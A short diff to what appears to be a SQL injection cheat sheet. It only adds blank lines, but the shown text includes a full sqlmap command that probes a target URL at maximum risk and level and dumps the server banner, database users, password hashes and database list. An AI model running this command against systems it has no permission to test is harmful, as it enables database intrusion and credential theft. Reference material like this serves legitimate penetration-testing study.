@@ -24,11 +24,13 @@ However you should always know how SQLmap is working, and be able to replicate i
 * [SQLmap Without SQL Injection](#sqlmap-without-sql-injection)
 * [References](#references)
 
+
 ## Basic Arguments For SQLmap
 
 ```powershell
 sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
 ```
+
 
 ## Load A Request File
 
